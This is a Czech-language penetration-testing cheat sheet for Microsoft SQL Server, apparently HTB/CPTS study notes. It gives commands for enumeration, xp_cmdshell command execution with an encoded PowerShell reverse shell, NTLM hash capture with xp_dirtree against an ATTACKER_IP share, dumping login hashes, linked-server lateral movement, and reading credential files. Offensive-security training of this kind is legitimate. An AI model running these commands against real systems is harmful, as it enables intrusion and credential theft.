# MSSQL (Microsoft SQL Server) – Port 1433

MSSQL je **relační databázový systém od Microsoftu**.  
Používá protokol **TDS (Tabular Data Stream)** pro komunikaci mezi klientem a serverem.

---

# MSSQL Porty

|Port|Účel|
|---|---|
|TCP 1433|Standardní MSSQL instance|
|UDP 1434|SQL Browser Service (hledání instancí)|

---

# Autentizace

MSSQL podporuje:

|Typ|Popis|
|---|---|
|SQL Authentication|Uživatelské jméno + heslo v SQL|
|Windows Authentication|NTLM/Kerberos přes doménový účet|

---

# Enumerace

Cíl:

- zjistit verzi
- najít instance
- zjistit typ autentizace
- získat přístup

---

# Nmap Scan

```
nmap -p1433 \
--script mssql-info,mssql-empty-password,mssql-config \
TARGET
```

Zjistí:

- verzi MSSQL
- konfiguraci
- slabé účty

---

# Připojení

## Impacket mssqlclient

SQL Authentication:

```
mssqlclient.py user:password@TARGET
```

Windows Authentication:

```
mssqlclient.py \
-domain user:password@TARGET \
-windows-auth
```

---

# MSSQL Commands

Databáze:

```
SELECT name FROM master..sysdatabases;
```

Aktuální uživatel:

```
SELECT SYSTEM_USER;
```

Verze:

```
SELECT @@version;
```

---

# RCE přes xp_cmdshell

Nejčastější cesta k shellu.

Kontrola práv:

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Pokud:

```
1
```

jsi sysadmin.

---

## Aktivace xp_cmdshell

V mssqlclient:

```
enable_xp_cmdshell
```

---

## Spuštění příkazů

```
EXEC xp_cmdshell 'whoami';
```

Například:

```
EXEC xp_cmdshell 'powershell -e BASE64';
```

Dopad:

- příkazy na Windows
- reverse shell
- převzetí systému

---

# Credential Theft

---

# 1. NTLM Hash Stealing

MSSQL může donutit server autentizovat se proti tvému stroji.

SQL:

```
EXEC master..xp_dirtree 
'\\ATTACKER_IP\share';
```

Výsledek:

- zachycení NTLM hashe

Nástroje:

- Responder
- ntlmrelayx

---

# 2. SQL Login Hashes

Výpis:

```
SELECT name,password_hash 
FROM sys.sql_logins;
```

Hashe:

- lze crackovat offline
- Hashcat

---

# Linked Servers (Lateral Movement)

MSSQL servery mohou být propojené.

Najít:

```
SELECT name 
FROM sys.servers;
```

Použití:

```
EXEC('xp_cmdshell ''whoami''')
AT [SERVER_NAME];
```

Možnost:

- pohyb mezi servery
- útok v rámci infrastruktury

---

# Čtení souborů

Bez shellu lze číst soubory:

```
SELECT *
FROM OPENROWSET(
BULK 'C:\Users\Public\file.txt',
SINGLE_CLOB
) AS x;
```

Hledat:

```
web.config
passwords
id_rsa
config files
```

---

# MSSQL Pentest Checklist

☐ Port 1433 otevřený  
☐ UDP 1434 SQL Browser  
☐ Verze MSSQL  
☐ Slabé SQL účty  
☐ Windows Authentication  
☐ Sysadmin práva  
☐ xp_cmdshell dostupné  
☐ SQL login hashe  
☐ Linked Servers  
☐ Čtení souborů

---

# HTB / CPTS MSSQL Workflow

```
Nmap
 ↓
Port 1433
 ↓
Version Detection
 ↓
Login Test
 ↓
Enumerate Databases
 ↓
Check Privileges
 ↓
xp_cmdshell
 ↓
Command Execution
 ↓
Windows Access
 ↓
Privilege Escalation
```

---

# Nejčastější MSSQL nálezy

|Finding|Dopad|
|---|---|
|Weak SQL credentials|Přístup k DB|
|Sysadmin role|RCE přes OS|
|xp_cmdshell enabled|Remote shell|
|NTLM leak|Credential theft|
|Linked Servers|Lateral movement|
|Citlivé DB údaje|Únik dat|